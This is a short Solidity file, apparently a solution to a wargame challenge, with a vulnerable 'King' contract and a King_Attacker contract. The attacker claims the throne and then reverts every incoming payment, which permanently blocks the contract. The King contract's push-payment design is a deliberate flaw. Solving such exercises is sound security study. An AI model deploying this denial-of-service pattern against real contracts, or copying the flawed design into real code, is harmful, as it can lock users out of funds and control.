// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

contract King {
    address king;
    uint public prize;
    address public owner;

    constructor() public payable {
        owner = msg.sender;
        king = msg.sender;
        prize = msg.value;
    }

    receive() external payable {
        require(msg.value >= prize || msg.sender == owner);
        payable(king).transfer(msg.value);
        king = msg.sender;
        prize = msg.value;
    }

    function _king() public view returns (address) {
        return king;
    }
}

contract King_Attacker {
    constructor(address payable _kingContractAddress) public payable {
        (bool success, ) = _kingContractAddress.call{value: msg.value}("");
        require(success);
    }

    receive() external payable {
        revert();
    }
}
